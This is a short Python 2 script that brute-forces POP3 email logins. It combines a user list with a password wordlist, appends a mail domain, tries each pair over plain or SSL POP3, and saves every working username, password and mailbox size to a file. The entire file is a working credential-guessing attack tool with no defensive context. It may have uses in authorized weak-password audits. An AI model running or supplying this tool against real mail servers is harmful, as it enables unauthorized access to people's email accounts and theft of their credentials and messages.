import poplib
import sys
import time
 
if len(sys.argv) !=6:
	print "\tUsage: %s <userlist> <wordlist> <port> <server> <@chinabaiker.com> \n" %sys.argv[0]
	sys.exit(1)
success1 = open('mailsuccess1.txt','w')
user = sys.argv[1]
words = sys.argv[2]
port = sys.argv[3]
server = sys.argv[4]
name = sys.argv[5]

userlist = open(user,'r').read().split("\n")
wordslist = open(words,'r').read().split("\n")
success = []
 
for mail_user in userlist:
	agent_user = mail_user
	mail_user = agent_user + name
	for mail_pass in wordslist:
		if "{username}" in mail_pass:
			mail_pass = mail_pass.replace("{username}",agent_user)
		try:
			print "+"*12
			print "[*]"+mail_user +":" +mail_pass
			if int(port)==110:
				popserver = poplib.POP3(server,110)         
			else: 
				popserver = poplib.POP3_SSL(server,995) 
			popserver.user(mail_user) 
			auth = popserver.pass_(mail_pass) 
			if auth.split(' ')[0] == "+OK" or auth =="+OK": 
				res = (mail_user,mail_pass,popserver.stat()[0],popserver.stat()[1]) 
				success.append(res)
				print success
				print>>success1,success
				popserver.quit() 
				break
			else : 
				popserver.quit() 
				continue
		except:
				pass
				time.sleep(1)
 
 
print "\n+++++++++++++++++++++++++++++++++++++"
print "+++++++++++++++++++++++++++++++++++++"
 
if len(success)==0:
	print "[-]-_-|| no weakpass "
if len(success) >=1:
	print "[+] have weakpass :"
	for res in success: 
		print "\n[+] Login successful:",res[0], res[1] 
		print "\t[+] Mail:",res[2],"emails"
		print "\t[+] Size:",res[3],"bytes\n"
print "\n[-] Done"

